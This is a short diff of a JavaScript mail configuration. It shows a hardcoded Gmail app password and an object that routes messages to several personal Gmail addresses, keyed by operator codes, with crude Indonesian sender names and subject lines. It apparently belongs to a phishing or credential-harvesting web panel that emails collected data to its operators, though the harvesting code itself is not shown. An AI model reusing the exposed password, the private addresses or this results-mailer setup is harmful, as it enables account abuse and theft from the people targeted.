@@ -19,17 +19,17 @@ const SENDER_PASSWORD = 'tmyh wklt uyig lots';
 const EMAIL_CONFIG = {
     'wxyzzay': {
         email: ['chilligemaass@gmail.com'],
-        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗪𝗘𝗕',        // Nama pengirim di Gmail
+        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',        // Nama pengirim di Gmail
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   // Subject email                       
     },
     'ggwxzzr': {
-        email: ['akunvanzz888@gmail.com', 'chilligemaass@gmail.com'],
-        fromName: '𝗕𝗔𝗬𝗭𝗭 𝗠𝗢𝗗𝗘 𝗪𝗘𝗕',
+        email: ['bayuprabowo0202@gmail.com', 'chilligemaass@gmail.com'],
+        fromName: '𝗕𝗔𝗬𝗭𝗭 𝗟𝗔𝗚𝗜 𝗠𝗢𝗢𝗗 𝗡𝗘𝗕𝗔𝗥🔥🥱',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     },
     'hgefdyt': {
         email: ['zamzaja78@gmail.com', 'chilligemaass@gmail.com'],
-        fromName: '𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗪𝗘𝗕',
+        fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
         subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
     }
 };
